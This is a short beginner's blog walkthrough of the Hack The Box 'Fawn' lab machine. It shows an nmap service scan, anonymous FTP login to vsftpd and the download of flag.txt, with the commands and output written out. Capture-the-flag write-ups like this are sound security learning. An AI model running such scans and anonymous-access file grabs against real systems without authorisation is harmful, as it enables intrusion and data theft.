# 🦌 Fawn | Hack The Box

> _Note: I’m not an expert. I’m writing this blog just to document my learning journey. 🚀_

---

### 🎯 Step 1: Setup

I connected to the Hack The Box VPN, then spawned the **Fawn** target machine and got its IP address:

```
10.129.197.22
```

---

### 🔍 Step 2: Scanning with Nmap

I ran an Nmap scan on the machine:

```bash
nmap -sV -sC -Pn 10.129.197.22
```

**Nmap output:**

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              32 Jun 04  2021 flag.txt
```

Only **port 21 (FTP)** is open, and **anonymous login is allowed**. I also noticed a file named `flag.txt` is accessible via FTP!

---

### ❓ What is FTP?

> **FTP (File Transfer Protocol)** is used to transfer files between a client and server over a network.
> It typically runs over **TCP**, not **UDP**, because file transfers need to be reliable and complete.

---

### 🛠️ Step 3: FTP Access

At first, when I tried to use `ftp`, I got an error:

```
command not found
```

So I installed the FTP client:

```bash
sudo apt install ftp
```

Then I connected to the target using **anonymous login**:

```bash
ftp 10.129.197.22

Name: anonymous
Password: [just press Enter]
```

Once logged in, I listed the files:

```bash
ls
```

Output:

```
flag.txt
```

Then I downloaded the file:

```bash
get flag.txt
```

---

### 🏁 Step 4: Capture the Flag

After downloading, I viewed the flag:

```bash
cat flag.txt
```

🎉 **Root Flag Captured!**

---

### 📚 Summary

- **Service found**: FTP on port 21
- **Vulnerability**: Anonymous login allowed
- **Exploit**: Connect and download the `flag.txt` file via FTP

---

### 🚀 Final Thoughts

This was a simple but great beginner-friendly machine that teaches:

- Basic Nmap scanning
- FTP concepts
- Anonymous access exploitation

---

📝 _Happy hacking!_

---
